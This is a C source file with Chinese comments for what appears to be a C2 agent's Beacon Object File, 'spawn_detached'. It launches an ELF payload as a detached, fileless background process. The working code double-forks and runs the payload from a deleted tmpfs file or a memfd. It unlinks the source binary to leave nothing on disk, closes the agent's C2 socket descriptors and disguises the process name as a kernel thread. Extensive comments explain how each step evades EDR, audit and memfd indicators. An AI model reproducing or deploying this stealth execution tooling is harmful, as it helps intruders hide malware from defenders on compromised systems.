/// spawn_detached.c — BOF: 把 ELF 丢成"无父、无盘、无 fd"的后台进程。
/// Compile: gcc -c -o spawn_detached.o spawn_detached.c -include bof_api.h -Os -fPIC
/// Usage:   execute bof spawn_detached.o <elf-path> [--keep] [argv0 [args...]]
///
/// 规格：doc/高隐匿持久化方案.md §3.1 / §3.2（门 S1 磁盘零残留）
///
///   父（agent）: 读完整载荷 → 建可执行载体（见下"载体路线"）→ pipe → fork
///     子: setsid → fork → exit(0)              ← 秒退；父 waitpid 收尸，无僵尸
///     孙: 关掉除 {载体 fd, 回退读端, 管道写端} 外的全部 fd
///         → stdio → /dev/null
///         → unlink(源)                          ← S1
///         → 管道上报 [4B pid][1B 0x01]
///         → 关管道（绝不能跟载荷进 execve）
///         → execve(/proc/self/fd/<载体>) → 失败才会走"回退"或 exit(3)
///   父: 收 pid+状态 → waitpid(子) → close(载体) → 探 /proc/<孙pid> 判活 → 立即返回
///
/// 载体路线（P1-b：消掉 memfd 这个一级 IOC，方案 §3.4 / 清单 A5·B5·B6）：
///   A(首选) tmpfs 文件 <dir>/.m<8hex>，写完立刻 unlink
///           → /proc/<pid>/{exe,maps,fd} 显示 "<dir>/.mXXXXXXXX (deleted)"，
///             与"任何删掉自己的临时文件"同形；tmpfs 依旧是内存文件系统，
///             全程无盘（断电即失），门 S1 不受影响；也不再产生 memfd_create
///             这个系统调用本身（audit/eBPF EDR 的独立触发点）。
///   B(回退) 匿名 memfd —— 目录不可写、或 execve 被拒（noexec 挂载 / LSM 拒绝
///           该路径执行）时使用。隐匿性降级，但保证载荷一定起得来。
///   内核把 memfd 的 maps 名硬编码成 "/memfd:<name>"；随机化后缀只能躲掉
///   "名字固定"，躲不掉"这是 memfd" —— 所以整条路线换掉，而不是换个名字。
///
/// 为什么不复用 memfd_exec.c（三处都是硬伤，不是风格差异）：
///   1. memfd_exec 的父进程**阻塞在 waitpid** —— 载荷活多久，agent 就被拖住多久
///      （beacon 停跳 = 服务端看到掉线）。这里父进程等的只是中间子进程（秒退）。
///   2. memfd_exec 让载荷继承 agent 的全部 fd。若 agent 的 socket 没置 CLOEXEC，
///      载荷就攥着 C2 连接：载荷一退出服务端就看到"连接被对端关闭"，而且载荷的
///      /proc/<pid>/fd 里明摆着一个 socket —— 现成的检测破绽。这里孙进程把 >2 的
///      fd 一律关掉（只按例外表留 memfd 与管道写端）。
///   3. memfd_exec 把源 ELF 留在磁盘上（门 S1 直接不过）。这里 execve 之前 unlink。
///
/// 握手协议为什么长这样（第一版踩的坑，留档）：
///   第一版把 memfd 建在**孙**进程、把"武装完成"字节写在 close_all_fds() **之后**
///   —— 管道写端早被自己关掉，父进程只读到 EOF，于是每条回执都谎报
///   "died before arming"（实测：载荷其实跑得好好的）。现在 memfd 提前到父进程建，
///   写失败立刻可见、不必等 fork；孙进程关 fd 时按例外表保住 memfd 与管道写端；
///   报完状态马上关管道；父进程再用 /proc/<pid> 是否存在判 execve 是否真成功。

#include "bof_api.h"

#define O_RDONLY     0
#define O_RDWR       02
// 载体 fd 一律 CLOEXEC（AxTmpfsCarrier 内部已带）。AxExecFdArgv 走
// execve("/proc/self/fd/N")，路径解析发生在内核关闭 CLOEXEC fd **之前**，所以
// execve 照样成功，而 fd 不会留给载荷 —— 否则 /proc/<载荷pid>/fd 里明摆着一个
// "(deleted)" 的匿名可执行文件（B6）。回退用的 memfd 同理。
#define MFD_CLOEXEC  0x0001U
#define MAX_TOK  16
#define PATH_MAX_ 512
#define ARGV_MAX  2048
#define FD_SWEEP_MAX 4096     // 盲扫上界：close() 对无效 fd 只回 EBADF，代价微秒级

/// 关掉 3..FD_SWEEP_MAX 里除 keep1/keep2/keep3 之外的全部 fd（-1 = 无例外）。
/// 不用 /proc/self/fd 枚举——边读边关会打乱目录 fd 自身；盲扫不会漏，也简单。
static void close_fds_except(int keep1, int keep2, int keep3) {
    for (int fd = 3; fd < FD_SWEEP_MAX; fd++)
        if (fd != keep1 && fd != keep2 && fd != keep3) AxCloseFile(fd);
}

/// ── 可执行载体 ────────────────────────────────────────────────────────────
/// 路线 A 直接复用 agent 侧的 AxTmpfsCarrier（memfd_exec.c 用的是同一个原语，
/// 实现只有一份）。这里只负责"拿不到 tmpfs 就退回 memfd"。
/// 返回值 = 执行用 fd；<3 表示两条路线都没建起来。
static int ax_open_carrier(const char *payload, int plen, int *out_rfd, int *out_route) {
    *out_route = 1;                            // 默认按 memfd 记，走 A 成功再改

    int fd = AxTmpfsCarrier(payload, plen, out_rfd);
    if (fd >= 3) { *out_route = 0; return fd; }

    // 路线 B：匿名 memfd。纯内存 —— 比任何"可能是磁盘"的目录都安全
    // （见 AxTmpfsCarrier 里为什么排除 /tmp、/var/tmp）。
    *out_rfd = -1;
    int mfd = AxMemfdCreateRandom(MFD_CLOEXEC);
    if (mfd < 3) return mfd;
    if (AxWriteFile(mfd, payload, plen) != plen) { AxCloseFile(mfd); return -1; }
    return mfd;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    // ── 取全部 token（console 明文与 param_data(base64) 两条通道同一 ABI）──
    char *tok[MAX_TOK];
    int   tlen[MAX_TOK];
    int   n = 0;
    while (parser.length > 0 && n < MAX_TOK) {
        int l = 0;
        char *t = BeaconDataExtract(&parser, &l);
        if (!t || l <= 0) break;
        tok[n] = t; tlen[n] = l; n++;
    }
    if (n < 1) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] spawn_detached: usage: <elf-path> [--keep] [argv0 [args...]]\n");
        return;
    }
    // 解析完再拷进本地缓冲；token 是无 NUL 的切片，且源 blob 在最后一个字段处
    // 就结束了 —— 就地补 NUL 会越界写 1 字节（memfd_exec 就是这么写的）。
    char path[PATH_MAX_];
    if (tlen[0] >= PATH_MAX_) {
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: path too long\n");
        return;
    }
    AxMemcpy(path, tok[0], tlen[0]);
    path[tlen[0]] = '\0';

    // ── 参数：--keep 保留源文件（仅测试用），其余 token 当 argv ──
    int keep = 0;
    char argbuf[ARGV_MAX];
    char *cargv[MAX_TOK + 2];
    int ac = 0, alen = 0;
    for (int i = 1; i < n; i++) {
        if (tlen[i] == 6 && AxStrncmp(tok[i], "--keep", 6) == 0) { keep = 1; continue; }
        if (alen + tlen[i] + 1 > ARGV_MAX || ac >= MAX_TOK) break;
        AxMemcpy(argbuf + alen, tok[i], tlen[i]);
        cargv[ac++] = argbuf + alen;
        alen += tlen[i];
        argbuf[alen++] = '\0';
    }
    if (ac == 0) {
        // 没给 argv 时别让 cmdline 空着 —— 空 cmdline 在 ps 里比假名字更刺眼。
        // argv[0] 伪装成内核线程名（内核线程的 cmdline 本来就是空的）。
        cargv[ac++] = (char *)"[kworker/0:1]";
    }
    cargv[ac] = (char *)0;

    // ── 载荷在 fork 之前读完并灌进 memfd（父进程做）──
    // 多线程 agent 里子进程不能再碰 malloc/锁（fork 只复制调用线程，别的线程可能
    // 正持锁）；读+写都在父进程完成，孙进程只走 syscall。失败也在这里同步暴露。
    char *payload = (char *)0;
    int plen = AxReadFileToBuffer(path, &payload, 64 * 1024 * 1024);
    if (plen <= 0 || !payload) {
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: cannot read %s\n", path);
        return;
    }
    int rfd = -1, route = 1;
    int mfd = ax_open_carrier(payload, plen, &rfd, &route);
    if (mfd < 3) {
        // 0/1/2 会被下面的 stdio 重定向覆盖掉，等于把可执行映像砸了 —— 直接报错
        AxFree(payload);
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: no exec carrier (fd=%d)\n", mfd);
        return;
    }
    AxFree(payload);                      // 内容已在载体，没必要再占 agent 内存

    int pfd[2];
    if (AxPipe(pfd) != 0) {
        AxCloseFile(mfd);
        if (rfd >= 3) AxCloseFile(rfd);
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: pipe failed\n");
        return;
    }

    int pid = AxFork();
    if (pid < 0) {
        AxCloseFile(pfd[0]); AxCloseFile(pfd[1]); AxCloseFile(mfd);
        if (rfd >= 3) AxCloseFile(rfd);
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: fork failed\n");
        return;
    }

    if (pid == 0) {
        // ── 子：新会话（脱离 agent 的会话/进程组，日后 killpg 波及不到载荷）──
        AxSetsid();
        int gpid = AxFork();
        if (gpid == 0) {
            // ── 孙：真正要留下的进程；execve 成功后这里的一切都消失 ──
            close_fds_except(mfd, rfd, pfd[1]);   // C2 socket、日志、管道读端…全关
            int nfd = AxOpenFile("/dev/null", O_RDWR, 0);
            if (nfd >= 0) {
                AxDup2(nfd, 0); AxDup2(nfd, 1); AxDup2(nfd, 2);
                if (nfd > 2) AxCloseFile(nfd);
            }
            if (!keep) AxUnlink(path);        // S1：源已无用（失败也只是留个文件）

            int me = AxGetPid();
            AxWriteFile(pfd[1], &me, 4);
            AxWriteFile(pfd[1], "\x01", 1);   // 武装完成：memfd 已由父进程写好
            AxCloseFile(pfd[1]);              // 管道绝不能跟进 execve 后的载荷

            AxExecFdArgv(mfd, cargv, (char **)0);

            // ── 路线 A 的兜底：execve 被拒 ──
            // 走到这里说明载荷没起来（noexec 挂载、或 LSM/AppArmor 拒绝该路径执行；
            // 这两种情况都不是"能不能写"能预判的，所以用一个真实 execve 当探针）。
            // 此时 rfd 仍开着且偏移为 0（execve 失败推的是 **执行 fd** 的 f_pos），
            // 内容原样可读，不需要重新落盘。退回匿名 memfd：隐匿性降级，但载荷起得来。
            if (route == 0 && rfd >= 3) {
                int mfd2 = AxMemfdCreateRandom(MFD_CLOEXEC);
                if (mfd2 >= 3) {
                    char cbuf[16384];
                    int r = -1;
                    while ((r = AxReadFile(rfd, cbuf, (int)sizeof(cbuf))) > 0) {
                        if (AxWriteFile(mfd2, cbuf, r) != r) break;
                    }
                    if (r == 0) AxExecFdArgv(mfd2, cargv, (char **)0);   // r==0 = 读到 EOF 才完整
                }
            }
            AxExit(3);                        // 只有两条路线都失败才到得了这里
        }
        AxExit(0);                            // 子：立刻退，父进程 waitpid 收尸
    }

    // ── 父（agent）：只等"孙进程是否武装成功"，不等载荷本身 ──
    AxCloseFile(pfd[1]);
    int gpid = 0;
    int r = AxReadFile(pfd[0], &gpid, 4);
    unsigned char st = 0;
    int r2 = (r == 4) ? AxReadFile(pfd[0], &st, 1) : 0;
    AxCloseFile(pfd[0]);
    int wstatus = 0;
    AxWaitPid(pid, &wstatus);                 // 中间子进程秒退 → 不产生僵尸
    AxCloseFile(mfd);                         // 孙进程那份是唯一还需要它的
    if (rfd >= 3) AxCloseFile(rfd);

    if (r != 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] spawn_detached: fork chain failed\n");
        return;
    }
    // 判活：execve 失败的话孙进程已经 exit(3)，/proc/<pid> 随之消失。
    // （载荷自己秒退也会落到这个分支——回执里说清楚，不假装。）
    char pbuf[64];
    AxSnprintf(pbuf, (int)sizeof(pbuf), "/proc/%d", gpid);
    int alive = AxOpenFile(pbuf, O_RDONLY, 0);
    if (alive >= 0) AxCloseFile(alive);

    // ── 载体路线按**观测**报，不按意图报 ──────────────────────────────────
    // 孙进程的"武装完成"标记必须写在 execve **之前**（execve 成功后映像已被替换，
    // 没有代码能再写一个字节），所以 st==1 只证明"走到了 execve"，**不证明走的是哪条
    // 路线**：路线 A 被内核拒掉、回退到 memfd 时，父进程手里的 route 仍是 0。
    // 结果是**回退被报成了它自己的反面** —— 操作员以为还是 tmpfs，实际 "memfd:" 前缀
    // 已经回来了。这里改用与验收脚本同一手法（读 /proc/<pid>/exe，即对手的观测）拿真实值：
    // 目标是 "/memfd:<name> (deleted)" → memfd；否则（"/dev/shm/.mXXXX (deleted)"）→ tmpfs。
    if (alive >= 0) {
        char ep[64], eb[160];
        AxSnprintf(ep, (int)sizeof(ep), "/proc/%d/exe", gpid);
        int efd = AxOpenFile(ep, O_RDONLY, 0);
        if (efd >= 0) {
            int el = AxReadFile(efd, eb, (int)sizeof(eb) - 1);
            AxCloseFile(efd);
            if (el > 0) {
                eb[el] = '\0';
                int is_memfd = 0;
                for (int i = 0; i + 6 <= el; i++) {
                    if (eb[i] == 'm' && eb[i+1] == 'e' && eb[i+2] == 'm' &&
                        eb[i+3] == 'f' && eb[i+4] == 'd' && eb[i+5] == ':') { is_memfd = 1; break; }
                }
                route = is_memfd ? 1 : 0;
            }
        }
    }

    if (r2 == 1 && st == 1 && alive >= 0) {
        // 报出载体路线：回退到 memfd 是隐匿性降级（"memfd:" 前缀回来了），
        // 静默降级等于让操作员以为还是路线 A —— 必须可见。
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] spawn_detached: pid=%d detached%s (%s+exec verified)\n",
                     gpid, keep ? ", source kept" : ", source unlinked",
                     route == 0 ? "tmpfs" : "memfd");
    } else if (r2 == 1 && st == 1) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] spawn_detached: pid=%d armed but /proc entry gone"
                     " (execve failed or payload exited immediately)\n", gpid);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] spawn_detached: pid=%d died before arming\n", gpid);
    }
}
